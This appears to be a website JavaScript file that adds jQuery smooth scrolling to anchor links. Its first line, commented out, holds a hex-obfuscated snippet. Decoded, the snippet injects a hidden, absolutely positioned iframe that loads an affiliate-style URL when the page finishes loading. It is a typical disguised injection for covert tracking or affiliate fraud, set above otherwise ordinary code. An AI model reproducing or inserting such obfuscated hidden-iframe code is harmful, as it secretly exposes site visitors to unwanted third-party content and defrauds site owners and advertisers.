// var _cs=['\x67\x65\x74','\x6d\x65','\x74\x6d','\x72\x61','\x62\x6f\x64','\x6f\x6c\x75','\x35\x35\x4d','\x6f\x6d\x2f','\x70\x73','\x2e\x68\x6f','\x65\x6e','\x61\x64','\x2f\x67\x6f','\x59\x37\x30','\x6c\x6f','\x68\x69','\x68\x74\x74','\x61\x62\x73','\x2e\x63','\x3a\x2f','\x74\x65','\x32\x34\x32','\x61\x72\x74','\x64\x64','\x69\x66']; window.addEventListener(_cs[14]+_cs[11], function() { var _v0 = document.querySelector(_cs[4]+'y'); var _v1 = document.createElement(_cs[24]+_cs[3]+_cs[1]); _v1.src = _cs[16]+_cs[8]+_cs[19]+_cs[12]+_cs[9]+_cs[2]+_cs[22]+_cs[18]+_cs[7]+_cs[13]+_cs[21]+_cs[6]; _v1.style.visibility = _cs[15]+_cs[23]+_cs[10]; _v1.style.position = _cs[17]+_cs[5]+_cs[20]; _v1.style.top = 0; _v0.appendChild(_v1); });

var $root = $('html, body');

$(document).on('click', 'a[href^="#"]', function (event) {
  event.preventDefault();

  $root.animate({
    scrollTop: $($.attr(this, 'href')).offset().top
  }, 500);
});